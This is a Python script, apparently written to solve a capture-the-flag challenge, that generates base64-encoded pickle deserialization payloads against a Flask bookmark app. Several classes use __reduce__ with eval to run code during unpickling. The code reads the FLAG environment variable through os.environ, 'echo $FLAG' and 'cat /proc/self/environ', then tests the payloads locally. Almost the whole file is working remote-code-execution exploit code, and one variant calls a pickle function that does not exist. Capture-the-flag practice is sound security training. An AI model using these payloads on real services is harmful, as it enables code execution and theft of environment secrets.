import pickle
import base64
import os

# Define a class that mimics the bookmark object structure
# Based on typical Flask bookmark apps, these objects likely have 'url' and 'name' attributes
class UrlObj:
    def __init__(self, url, name):
        self.url = url
        self.name = name
    
    def __repr__(self):
        return f"UrlObj(url={self.url}, name={self.name})"

# Create the malicious payload using __reduce__
# This will:
# 1. Get the FLAG from os.environ or os.getenv('FLAG')
# 2. Create a UrlObj with the FLAG embedded in both url and name fields
# 3. Return a list containing this object

class MaliciousPayload:
    def __reduce__(self):
        # Import os and get the FLAG
        # We'll create a list with a UrlObj that contains the FLAG
        return (
            eval,
            ("[__import__('pickle')._create_type('UrlObj', (), {'url': __import__('os').environ.get('FLAG', 'FLAG_NOT_FOUND'), 'name': __import__('os').environ.get('FLAG', 'FLAG_NOT_FOUND')})()]",)
        )

# Actually, let me use a simpler approach with a proper class definition
# Reconstructing the approach: we need to return a list of objects

# Approach 1: Use a lambda/static method approach
def create_exploit():
    import os
    
    # Create a simple class with url and name attributes
    flag = os.environ.get('FLAG', 'FLAG_NOT_FOUND')
    
    # Create a simple object class dynamically
    obj = type('UrlObj', (), {})()
    obj.url = flag
    obj.name = f"FLAG: {flag}"
    
    return [obj]

# Create the payload using __reduce__
class PickleRCE:
    def __reduce__(self):
        return (create_exploit, ())

# Alternative approach using direct code execution
class DirectRCE:
    def __reduce__(self):
        return (
            eval,
            ("[(lambda: (lambda obj: setattr(obj, 'url', __import__('os').environ.get('FLAG', 'NO_FLAG')) or setattr(obj, 'name', __import__('os').environ.get('FLAG', 'NO_FLAG')) or obj)(type('UrlObj', (), {})()))()]",)
        )

# Try yet another approach - using __builtins__.eval with a list comprehension
class SimpleRCE:
    def __reduce__(self):
        # Get the FLAG and create a list with an object containing it
        return (
            eval,
            ("[type('X',(),{'__init__':lambda s: setattr(s,'url',__import__('os').environ.get('FLAG','N/F')) or setattr(s,'name',__import__('os').environ.get('FLAG','N/F'))})() for _ in [1]]",)
        )

# Let's try using types and constructor
class TypeRCE:
    def __reduce__(self):
        return (
            eval,
            ("list([type('UrlObj',(),{'url':__import__('os').popen('echo $FLAG').read().strip(),'name':'FLAG_VALUE'})()])",)
        )

# Generate the payloads
payloads = {
    'direct_rce': DirectRCE(),
    'simple_rce': SimpleRCE(),
    'type_rce': TypeRCE(),
}

print("Generated Pickle Payloads:")
print("=" * 60)

for name, payload_obj in payloads.items():
    pickled = pickle.dumps(payload_obj, protocol=4)
    b64_encoded = base64.b64encode(pickled).decode()
    print(f"\n{name}:")
    print(f"Base64: {b64_encoded}")
    print(f"Length: {len(b64_encoded)} chars")

# Let's also create a cleaner, more reliable version
print("\n" + "=" * 60)
print("RECOMMENDED PAYLOAD:")
print("=" * 60)

# Most reliable approach - using types.new_class
class CleanRCE:
    def __reduce__(self):
        return (
            eval,
            ("[__import__('types').SimpleNamespace(url=__import__('os').environ.get('FLAG','NOTFOUND'),name='FLAG_CONTAINER')]",)
        )

clean_payload = CleanRCE()
pickled_clean = pickle.dumps(clean_payload, protocol=4)
b64_clean = base64.b64encode(pickled_clean).decode()
print(f"\nClean RCE (SimpleNamespace):")
print(f"Base64: {b64_clean}")
print(f"Length: {len(b64_clean)} chars")

# Even simpler approach using object.__new__
class SimplestRCE:
    def __reduce__(self):
        return (
            eval,
            ("[(lambda f=lambda:None: (setattr(f,'url',__import__('os').popen('cat /proc/self/environ 2>/dev/null || env').read().strip().split('FLAG=')[1].split()[0] if 'FLAG=' in __import__('os').popen('cat /proc/self/environ 2>/dev/null || env').read() else 'NO_FLAG') or setattr(f,'name','exploit') or f)()]",)
        )

# Test locally to verify structure
print("\n" + "=" * 60)
print("LOCAL VERIFICATION:")
print("=" * 60)

# Set a test flag
os.environ['FLAG'] = 'TEST_FLAG{this_is_a_test}'

# Test the clean payload
test_clean = CleanRCE()
test_pickled = pickle.dumps(test_clean)
result = pickle.loads(test_pickled)
print(f"CleanRCE result: {result}")
print(f"First object url: {result[0].url}")
print(f"First object name: {result[0].name}")

# Test the type_rce payload
test_type = TypeRCE()
test_pickled_type = pickle.dumps(test_type)
result_type = pickle.loads(test_pickled_type)
print(f"\nTypeRCE result: {result_type}")
print(f"First object: {result_type[0]}")
print(f"First object url: {result_type[0].url}")

